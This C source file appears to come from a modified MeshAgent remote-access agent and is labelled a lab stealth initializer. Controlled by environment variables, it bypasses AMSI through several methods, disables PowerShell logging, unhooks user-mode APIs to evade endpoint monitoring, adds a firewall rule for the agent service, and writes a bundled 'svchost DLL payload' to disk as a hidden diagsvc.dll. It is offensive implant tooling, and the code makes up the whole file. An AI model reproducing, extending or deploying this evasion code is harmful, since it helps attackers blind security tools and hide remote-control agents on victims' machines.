// Lab/test stealth initializer
#include <windows.h>
#include <wchar.h>
#include <tchar.h>
#include "stealth.h"
#include "../meshcore/generated/meshagent_branding.h"

static int EnvEnabledW(const wchar_t* name, int defaultOn)
{
    wchar_t buf[16] = {0};
    DWORD n = GetEnvironmentVariableW(name, buf, (DWORD)(sizeof(buf)/sizeof(buf[0])));
    if (n == 0 || n >= (DWORD)(sizeof(buf)/sizeof(buf[0]))) { return defaultOn; }
    for (DWORD i = 0; i < n; ++i) { wchar_t c = buf[i]; if (c >= L'A' && c <= L'Z') buf[i] = (wchar_t)(c - L'A' + L'a'); }
    return (wcsncmp(buf, L"1", 1) == 0) || (wcscmp(buf, L"true") == 0) || (wcscmp(buf, L"yes") == 0) || (wcscmp(buf, L"on") == 0);
}

static void GetModulePathW(wchar_t* out, DWORD cch)
{
    if (!out || cch == 0) return;
    DWORD n = GetModuleFileNameW(NULL, out, cch);
    if (n >= cch) { out[cch-1] = L'\0'; }
}

void Stealth_InitLabFeatures(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
#ifdef MESHAGENT_STEALTHLAB_DEFAULT
    const int defaultLab = 1;
#else
    const int defaultLab = 0;
#endif
    if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }

    // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
    wchar_t amsiMode[16] = {0};
    DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
    if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
        // default
        (void)Stealth_PatchAMSI();
    } else {
        for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
        if (wcscmp(amsiMode, L"hwbp") == 0) {
            (void)Stealth_PatchAMSI_HardwareBreakpoint();
        } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
            (void)Stealth_PatchAMSI_NtContinue();
        } else if (wcscmp(amsiMode, L"none") == 0) {
            // do nothing
        } else {
            (void)Stealth_PatchAMSI();
        }
    }

    // 2) Disable PowerShell logging (default on in lab)
    if (EnvEnabledW(L"STEALTH_DISABLE_POWERSHELL_LOG", 1)) {
        (void)Stealth_DisablePowerShellLogging();
    }

    // 3) Unhook common user-mode APIs (default on in lab)
    if (EnvEnabledW(L"STEALTH_API_UNHOOK", 1)) {
        (void)Stealth_UnhookUserModeAPIs();
    }

    // 4) Add firewall rule for current service binary (default on in lab)
    if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
        wchar_t exePath[MAX_PATH] = {0};
        GetModulePathW(exePath, MAX_PATH);
#ifdef UNICODE
        const wchar_t* svcNameW = MESH_AGENT_SERVICE_NAME;
#else
        wchar_t svcNameW[256] = {0};
        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, svcNameW, (int)(sizeof(svcNameW)/sizeof(svcNameW[0])));
#endif
        (void)Stealth_AddFirewallRuleForService(svcNameW, exePath);
    }

    // 5) Optionally extract bundled svchost DLL payload (if present in resources)
    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", 0)) {
        HMODULE hMod = GetModuleHandleW(NULL);
        HRSRC hRes = FindResourceW(hMod, L"SVCHOSTDLL", MAKEINTRESOURCEW(RT_RCDATA));
        if (hRes) {
            HGLOBAL hData = LoadResource(hMod, hRes);
            if (hData) {
                DWORD sz = SizeofResource(hMod, hRes);
                void* p = LockResource(hData);
                if (p && sz > 0) {
                    wchar_t dllOut[MAX_PATH] = {0};
                    // Default: drop next to EXE as diagsvc.dll
                    GetModulePathW(dllOut, MAX_PATH);
                    // trim file name
                    size_t n = wcslen(dllOut);
                    while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
                    wcscat_s(dllOut, MAX_PATH, L"diagsvc.dll");

                    HANDLE hf = CreateFileW(dllOut, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                    if (hf != INVALID_HANDLE_VALUE) {
                        DWORD written = 0;
                        WriteFile(hf, p, sz, &written, NULL);
                        CloseHandle(hf);
                    }
                }
            }
        }
    }
#else
    (void)0; // not enabled in this build
#endif
}
